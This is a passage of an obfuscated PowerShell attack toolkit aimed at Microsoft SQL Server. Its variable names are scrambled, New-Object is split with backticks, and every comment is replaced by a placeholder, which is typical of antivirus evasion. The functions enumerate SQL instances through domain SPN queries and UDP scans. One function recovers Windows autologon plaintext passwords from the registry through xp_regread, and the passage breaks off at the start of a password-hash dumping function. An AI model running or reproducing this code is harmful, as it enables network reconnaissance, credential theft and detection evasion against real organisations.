        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$MushyAcidic = 'Subtree'
    )
    Begin
    {
        # Microsoft".
        if($AnimalWeary -and $EasyAlert)
        {
            $StepSpark = ConvertTo-SecureString $EasyAlert -AsPlainText -Force
            $Credential = ne`w`-ob`je`ct -TypeName System.Management.Automation.PSCredential -ArgumentList ($AnimalWeary, $StepSpark)
        }

        # Microsoft".
        if ($AcidicChalk)
        {
           
            # Microsoft".
            try {

                $ArgumentList = ne`w`-ob`je`ct Collections.Generic.List[string]
                $ArgumentList.Add("LDAP://$AcidicChalk")

                if($AnimalWeary){
                    $ArgumentList.Add($Credential.UserName)
                    $ArgumentList.Add($Credential.GetNetworkCredential().Password)
                }

                $BridgeTickle = (ne`w`-ob`je`ct -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList).distinguishedname

                # Microsoft".
                if(-not $BridgeTickle){ throw }

            }catch{
                Write-CrazyChief "Authentication failed or domain controller is not reachable."
                Break
            }

            # Microsoft".
            if($FuelExist)
            {
                $FuelExist = '/'+$FuelExist+','+$BridgeTickle
                $ArgumentList[0] = "LDAP://$AcidicChalk$FuelExist"
            }

            $MissLight= ne`w`-ob`je`ct System.DirectoryServices.DirectoryEntry -ArgumentList $ArgumentList

            $AttachSuper = ne`w`-ob`je`ct -TypeName System.DirectoryServices.DirectorySearcher $MissLight
        }
        else
        {
            $BridgeTickle = ([ADSI]'').distinguishedName

            # Microsoft".
            if($FuelExist)
            {
                $FuelExist = $FuelExist+','+$BridgeTickle
                $MissLight  = [ADSI]"LDAP://$FuelExist"
            }
            else
            {
                $MissLight  = [ADSI]''
            }

            $AttachSuper = ne`w`-ob`je`ct -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $MissLight
        }

        # Microsoft".
        $AttachSuper.PageSize = $RhymeNation
        $AttachSuper.Filter = $SinStitch
        $AttachSuper.SearchScope = 'Subtree'
    }

    Process
    {
        try
        {
            # Microsoft".
            $AttachSuper.FindAll() | ForEach-Object -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $MaleTest = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $MaleTest"
        }
    }

    End
    {
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLInstanceDomain
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$AcidicChalk,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$HauntGusty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$FetchFuture,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$HumorBouncy,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Preforms a DNS lookup on the instance.')]
        [switch]$PenHands,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$HurryCopy = 3
    )

    Begin
    {
        # Microsoft".
        $JudgeCaring = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $JudgeCaring.Columns.Add('ComputerName')
        $null = $JudgeCaring.Columns.Add('Instance')
        $null = $JudgeCaring.Columns.Add('DomainAccountSid')
        $null = $JudgeCaring.Columns.Add('DomainAccount')
        $null = $JudgeCaring.Columns.Add('DomainAccountCn')
        $null = $JudgeCaring.Columns.Add('Service')
        $null = $JudgeCaring.Columns.Add('Spn')
        $null = $JudgeCaring.Columns.Add('LastLogon')
        $null = $JudgeCaring.Columns.Add('Description')

        if($PenHands)
        {
            $null = $JudgeCaring.Columns.Add('IPAddress')
        }
        # Microsoft".
    }

    Process
    {
        # Microsoft".
        Write-Verbose -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
        $YardUpbeat = Get-DomainSpn -AcidicChalk $AcidicChalk -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -HauntGusty $HauntGusty -FetchFuture $FetchFuture -BleachDead 'MSSQL*' -RaggedQuill | Where-Object -FilterScript {
            $_.service -like 'MSSQL*'
        }

        Write-Verbose -Message 'Parsing SQL Server instances from SPNs...'

        # Microsoft".
        $YardUpbeat |
        ForEach-Object -Process {
            # Microsoft".
            $MessyScrub = $_.Spn
            $Instance = $MessyScrub.split('/')[1].split(':')[1]

            # Microsoft".
            $RayPlucky = 0
            if([int32]::TryParse($Instance,[ref]$RayPlucky))
            {
                $UntidyLowly = $MessyScrub -replace ':', ','
            }
            else
            {
                $UntidyLowly = $MessyScrub -replace ':', '\'
            }

            $UntidyLowly = $UntidyLowly -replace 'MSSQLSvc/', ''

            $CalmWrist = @([string]$_.ComputerName,
                [string]$UntidyLowly,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
                [string]$_.Description)

            if($PenHands)
            {
                try 
                {
                    $ManMute = [Net.DNS]::GetHostAddresses([String]$_.ComputerName).IPAddressToString
                    if($ManMute -is [Object[]])
                    {
                        $ManMute = $ManMute -join ", "
                    }
                }
                catch 
                {
                    $ManMute = "0.0.0.0"
                }
                $CalmWrist += $ManMute
            }

            # Microsoft".
            $null = $JudgeCaring.Rows.Add($CalmWrist)
        }

        # Microsoft".
        if($HumorBouncy)
        {
            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
            $MouthMarble = Get-DomainSpn -AcidicChalk $AcidicChalk -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential  -HauntGusty $HauntGusty -FetchFuture $FetchFuture -BleachDead 'MSServerClusterMgmtAPI' -RaggedQuill |
            Where-Object -FilterScript {
                $_.ComputerName -like '*.*'
            } |
            Select-Object -Property ComputerName -Unique |
            Sort-Object -Property ComputerName

            Write-Verbose -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
            $OceanThings = $MouthMarble |
            Select-Object -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -HurryCopy $HurryCopy
        }
    }

    End
    {
        # Microsoft".
        if($HumorBouncy)
        {
            Write-Verbose -Message 'Parsing SQL Server instances from the UDP scan...'
            $BasinLimit = $OceanThings |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $SleetSecond = $JudgeCaring |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $NimbleKey = $BasinLimit + $SleetSecond

            $InstanceCount = $NimbleKey.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $NimbleKey
        }
        else
        {
            $InstanceCount = $JudgeCaring.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $JudgeCaring
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLInstanceLocal
{
    Begin
    {
        # Microsoft".
        $EndWhite = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $EndWhite.Columns.Add('ComputerName')
        $null = $EndWhite.Columns.Add('Instance')
        $null = $EndWhite.Columns.Add('ServiceDisplayName')
        $null = $EndWhite.Columns.Add('ServiceName')
        $null = $EndWhite.Columns.Add('ServicePath')
        $null = $EndWhite.Columns.Add('ServiceAccount')
        $null = $EndWhite.Columns.Add('State')
    }

    Process
    {
        # Microsoft".
        $UnpackThick = Get-SQLServiceLocal | Where-Object -FilterScript {
            $_.ServicePath -like '*sqlservr.exe*'
        }

        # Microsoft".
        $UnpackThick |
        ForEach-Object -Process {
            # Microsoft".
            $HauntGusty = [string]$_.ComputerName
            $ItchyRoot = [string]$_.ServiceDisplayName

            if($ItchyRoot)
            {
                $Instance = $HauntGusty + '\' +$ItchyRoot.split('(')[1].split(')')[0]
                if($Instance -like '*\MSSQLSERVER')
                {
                    $Instance = $HauntGusty
                }
            }
            else
            {
                $Instance = $HauntGusty
            }

            # Microsoft".
            $null = $EndWhite.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }

    End
    {

        # Microsoft".
        $SpookyLucky = $EndWhite.rows.count
        Write-Verbose -Message "$SpookyLucky local instances where found."

        # Microsoft".
        $EndWhite
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Get-SQLInstanceScanUDP
{
    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$HauntGusty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$HurryCopy = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FaxBattle = ne`w`-ob`je`ct -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $FaxBattle.columns.add('ComputerName')
        $null = $FaxBattle.columns.add('Instance')
        $null = $FaxBattle.columns.add('InstanceName')
        $null = $FaxBattle.columns.add('ServerIP')
        $null = $FaxBattle.columns.add('TCPPort')
        $null = $FaxBattle.columns.add('BaseVersion')
        $null = $FaxBattle.columns.add('IsClustered')
    }

    Process
    {
        if(-not $RaggedQuill)
        {
            Write-Verbose -Message " - $HauntGusty - UDP Scan Start."
        }

        # Microsoft".
        if ($HauntGusty -ne '')
        {
            # Microsoft".
            try
            {
                # Microsoft".
                $ManMute = [System.Net.Dns]::GetHostAddresses($HauntGusty)

                # Microsoft".
                $WhiteRight = ne`w`-ob`je`ct -TypeName System.Net.Sockets.Udpclient

                # Microsoft".
                $AmuseSongs = $HurryCopy * 1000
                $WhiteRight.client.ReceiveTimeout = $AmuseSongs
                $WhiteRight.Connect($HauntGusty,0x59a)
                $FuelSad = 0x03

                # Microsoft".
                $OvalLegs = ne`w`-ob`je`ct -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                $WhiteRight.Client.Blocking = $true
                [void]$WhiteRight.Send($FuelSad,$FuelSad.Length)

                # Microsoft".
                $BytesRecived = $WhiteRight.Receive([ref]$OvalLegs)
                $SkateArt = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                $BatWant = @{}

                for($AwakeOrder = 0; $AwakeOrder -le $SkateArt.length; $AwakeOrder++)
                {
                    if(![string]::IsNullOrEmpty($SkateArt[$AwakeOrder]))
                    {
                        $BatWant.Add(($SkateArt[$AwakeOrder].ToLower() -replace '[\W]', ''),$SkateArt[$AwakeOrder+1])
                    }
                    else
                    {
                        if(![string]::IsNullOrEmpty($BatWant.'tcp'))
                        {
                            if(-not $RaggedQuill)
                            {
                                $RefuseBurst = "$HauntGusty\"+$BatWant.'instancename'
                                Write-Verbose -Message "$HauntGusty - Found: $RefuseBurst"
                            }

                            # Microsoft".
                            $null = $FaxBattle.rows.Add(
                                [string]$HauntGusty,
                                [string]"$HauntGusty\"+$BatWant.'instancename',
                                [string]$BatWant.'instancename',
                                [string]$ManMute,
                                [string]$BatWant.'tcp',
                                [string]$BatWant.'version',
                            [string]$BatWant.'isclustered')
                            $BatWant = @{}
                        }
                    }
                }

                # Microsoft".
                $WhiteRight.Close()
            }
            catch
            {
                # Microsoft".
                # Microsoft".
                # Microsoft".

                # Microsoft".
                # Microsoft".
            }
        }
        if(-not $RaggedQuill)
        {
            Write-Verbose -Message " - $HauntGusty - UDP Scan Complete."
        }
    }

    End
    {
        # Microsoft".
        $FaxBattle
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Get-SQLInstanceBroadcast 
{

    [CmdletBinding()]
    Param(
            [Parameter(Mandatory = $false,
        HelpMessage = 'This will send a UDP request to each of the identified SQL Server instances to gather more information..')]
        [switch]$PestBike
    )

    Begin
    {
        # Microsoft".
        $YardUpbeat = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $YardUpbeat.Columns.Add('ComputerName')
        $null = $YardUpbeat.Columns.Add('Instance')
        $null = $YardUpbeat.Columns.Add('IsClustered')
        $null = $YardUpbeat.Columns.Add('Version')        

        Write-Verbose "Attempting to identify SQL Server instances on the broadcast domain."
    }

    Process
    {
        try {

            # Microsoft".
            $Instances = [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()

            # Microsoft".
            $Instances | 
            ForEach-Object {
                [string]$InstanceTemp =  $_.InstanceName
                if($InstanceTemp){
                    [string]$InstanceName = $_.Servername + "\" + $_.InstanceName
                }else{
                    [string]$InstanceName = $_.Servername 
                }
                [string]$HauntGusty = $_.Servername
                [string]$EscapeNaive  = $_.IsClustered
                [string]$Version      = $_.Version

                # Microsoft".
                $YardUpbeat.Rows.Add($HauntGusty, $InstanceName, $EscapeNaive, $Version) | Out-Null
            }
        }
        catch{

            # Microsoft".
            $ErrorMessage = $_.Exception.Message
            Write-CrazyChief -Message " Operation Failed."
            Write-CrazyChief -Message " Error: $ErrorMessage"     
        }
    }

    End
    {               
        # Microsoft".
        $InstanceCount = $YardUpbeat.Rows.Count
        Write-Verbose "$InstanceCount SQL Server instances were found."
        
        # Microsoft".
        if($PestBike){
            Write-Verbose "Performing UDP ping against $InstanceCount SQL Server instances."
            $YardUpbeat |
            ForEach-Object{
                $FaultyBoot = $_.ComuterName                
                Get-SQLInstanceScanUDP -HauntGusty $_.ComputerName -RaggedQuill
            }
        }         

        # Microsoft".
        if(-not $PestBike){
            $YardUpbeat
        }
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
function Get-SQLInstanceScanUDPThreaded
{

    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$HauntGusty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$HurryCopy = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FaxBattle = ne`w`-ob`je`ct -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $FaxBattle.columns.add('ComputerName')
        $null = $FaxBattle.columns.add('Instance')
        $null = $FaxBattle.columns.add('InstanceName')
        $null = $FaxBattle.columns.add('ServerIP')
        $null = $FaxBattle.columns.add('TCPPort')
        $null = $FaxBattle.columns.add('BaseVersion')
        $null = $FaxBattle.columns.add('IsClustered')
        $FaxBattle.Clear()

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
            $TinyHealth = $TinyHealth + $BeefSpy
        }
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $HauntGusty = $_.ComputerName

            if(-not $RaggedQuill)
            {
                Write-Verbose -Message " - $HauntGusty - UDP Scan Start."
            }


            # Microsoft".
            if ($HauntGusty -ne '')
            {
                # Microsoft".
                try
                {
                    # Microsoft".
                    $ManMute = [System.Net.Dns]::GetHostAddresses($HauntGusty)

                    # Microsoft".
                    $WhiteRight = ne`w`-ob`je`ct -TypeName System.Net.Sockets.Udpclient

                    # Microsoft".
                    $AmuseSongs = $HurryCopy * 1000
                    $WhiteRight.client.ReceiveTimeout = $AmuseSongs
                    $WhiteRight.Connect($HauntGusty,0x59a)
                    $FuelSad = 0x03

                    # Microsoft".
                    $OvalLegs = ne`w`-ob`je`ct -TypeName System.Net.Ipendpoint -ArgumentList ([System.Net.Ipaddress]::Any, 0)
                    $WhiteRight.Client.Blocking = $true
                    [void]$WhiteRight.Send($FuelSad,$FuelSad.Length)

                    # Microsoft".
                    $BytesRecived = $WhiteRight.Receive([ref]$OvalLegs)
                    $SkateArt = [System.Text.Encoding]::ASCII.GetString($BytesRecived).split(';')

                    $BatWant = @{}

                    for($AwakeOrder = 0; $AwakeOrder -le $SkateArt.length; $AwakeOrder++)
                    {
                        if(![string]::IsNullOrEmpty($SkateArt[$AwakeOrder]))
                        {
                            $BatWant.Add(($SkateArt[$AwakeOrder].ToLower() -replace '[\W]', ''),$SkateArt[$AwakeOrder+1])
                        }
                        else
                        {
                            if(![string]::IsNullOrEmpty($BatWant.'tcp'))
                            {
                                if(-not $RaggedQuill)
                                {
                                    $RefuseBurst = "$HauntGusty\"+$BatWant.'instancename'
                                    Write-Verbose -Message " - $HauntGusty - Found: $RefuseBurst"
                                }

                                # Microsoft".
                                $null = $FaxBattle.rows.Add(
                                    [string]$HauntGusty,
                                    [string]"$HauntGusty\"+$BatWant.'instancename',
                                    [string]$BatWant.'instancename',
                                    [string]$ManMute,
                                    [string]$BatWant.'tcp',
                                    [string]$BatWant.'version',
                                [string]$BatWant.'isclustered')
                                $BatWant = @{}
                            }
                        }
                    }

                    # Microsoft".
                    $WhiteRight.Close()
                }
                catch
                {
                    # Microsoft".
                    # Microsoft".
                    # Microsoft".

                    # Microsoft".
                    # Microsoft".
                }
            }

            if(-not $RaggedQuill)
            {
                Write-Verbose -Message " - $HauntGusty - UDP Scan End."
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $FaxBattle
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLInstanceFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $true,
        HelpMessage = 'The file path.')]
        [string]$FilePath
    )

    Begin
    {
        # Microsoft".
        $RemindHeat = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $RemindHeat.Columns.Add('ComputerName')
        $null = $RemindHeat.Columns.Add('Instance')
    }

    Process
    {
        # Microsoft".
        if(Test-Path $FilePath)
        {
            Write-Verbose -Message 'Importing instances from file path.'
        }
        else
        {
            Write-CrazyChief -PencilFlight 'File path does not appear to be valid.'
            break
        }

        # Microsoft".
        Get-Content -Path $FilePath |
        ForEach-Object -Process {
            $Instance = $_
            if($Instance.Split(',')[1])
            {
                $HauntGusty = $Instance.Split(',')[0]
            }
            else
            {
                $HauntGusty = $Instance.Split('\')[0]
            }

            # Microsoft".
            if($_ -ne '')
            {
                $null = $RemindHeat.Rows.Add($HauntGusty,$Instance)
            }
        }
    }

    End
    {

        # Microsoft".
        $FileInstanceCount = $RemindHeat.rows.count
        Write-Verbose -Message "$FileInstanceCount instances where found in $FilePath."

        # Microsoft".
        $RemindHeat
    }
}
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function   Get-SQLRecoverPwAutoLogon
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $FrogBone = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $FrogBone.Columns.Add("ComputerName") | Out-Null
        $FrogBone.Columns.Add("Instance") | Out-Null
        $FrogBone.Columns.Add("Domain") | Out-Null
        $FrogBone.Columns.Add("UserName") | Out-Null
        $FrogBone.Columns.Add("Password") | Out-Null
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Microsoft".
        $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($FirstStage)
        {
            $PlantsPlants = $FirstStage.Split('.')[0]
        }

        # Microsoft".
        if($LovingDry -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }

        # Microsoft".
        $ChubbyLying = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultDomainName',
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultUserName',
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultPassword',
        @value			= @AutoLoginPassword output

        -- Display Results
        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"

        # Microsoft".
        $SpillRelax = Get-SQLQuery -Instance $Instance -BoringLarge $ChubbyLying -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill     
        $ScarceMove = $SpillRelax.Username
        if($ScarceMove.length -ge 2){

            # Microsoft".
            $SpillRelax | ForEach-Object{                
                $FrogBone.Rows.Add($HauntGusty, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            Write-Verbose "$Instance : No default auto login credentials found."
        }

        # Microsoft".
        $CameraTeam = "
        -------------------------------------------------------------------------
        -- Get Alternative Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get Alt AutoLogin Default Domain
        DECLARE @AltAutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultDomainName',
        @value			= @AltAutoLoginDomain output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultUserName',
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultPassword',
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"

        # Microsoft".
        $HugeEarthy = Get-SQLQuery -Instance $Instance -BoringLarge $CameraTeam -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        $WasteEqual = $HugeEarthy.Username
        if($WasteEqual.length -ge 2){                            

             # Microsoft".
            $HugeEarthy | ForEach-Object{               
                $FrogBone.Rows.Add($HauntGusty, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No alternative auto login credentials found."
        }
    }

    End
    {
        # Microsoft".
         $FrogBone 
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function Get-SQLServerPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $KittyReport = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $BoringLarge = " -- Get-SQLServerPolicy.sql 
                SELECT '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                    p.policy_id,
		            p.name as [PolicyName],
		            p.condition_id,
		            c.name as [ConditionName],
		            c.facet,
		            c.expression as [ConditionExpression],
		            p.root_condition_id,
		            p.is_enabled,
		            p.date_created,
		            p.date_modified,
		            p.description, 
		            p.created_by, 
		            p.is_system,
                    t.target_set_id,
                    t.TYPE,
                    t.type_skeleton
                FROM msdb.dbo.syspolicy_policies p
                INNER JOIN msdb.dbo.syspolicy_conditions c 
	                ON p.condition_id = c.condition_id
                INNER JOIN msdb.dbo.syspolicy_target_sets t
	                ON t.object_set_id = p.object_set_id"

        # Microsoft".
        $ClamAgree = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $KittyReport = $KittyReport + $ClamAgree
    }

    End
    {
        # Microsoft".
        $AdviceCrow = $KittyReport.Count
        if($AdviceCrow -eq 0){

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : No policies found."
            }
        }
        
        # Microsoft".
        $KittyReport
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerPasswordHash
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
